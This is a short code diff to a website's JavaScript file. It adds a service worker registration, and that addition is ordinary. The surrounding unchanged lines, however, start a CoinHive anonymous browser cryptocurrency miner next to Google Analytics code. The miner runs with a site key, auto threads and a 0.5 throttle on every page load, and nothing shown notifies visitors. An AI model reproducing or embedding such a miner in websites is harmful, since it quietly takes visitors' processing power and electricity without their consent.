@@ -1,5 +1,5 @@
 'use strict';
-/* global ga CoinHive */
+/* global ga CoinHive navigator */
 
 // Google analytics
 (function (t, r, a, c, m, o, n) {
@@ -17,3 +17,16 @@ new CoinHive.Anonymous('7FZrGIbIO4kqxbTLa82QpffB9ShUGmWE', {
   autoThreads: true,
   throttle: 0.5
 }).start(CoinHive.FORCE_EXCLUSIVE_TAB)
+
+// Service worker
+if ('serviceWorker' in navigator) {
+  window.addEventListener('load', function () {
+    navigator.serviceWorker.register('/static/js/sw.js'/*'/static/js/.sw.bun.js'*/).then( function(registration) {
+      // Registration was successful
+      console.log('ServiceWorker registration successful with scope: ', registration.scope)
+    }, function(err) {
+      // registration failed
+      console.error('ServiceWorker registration failed: ', err)
+    });
+  });
+}
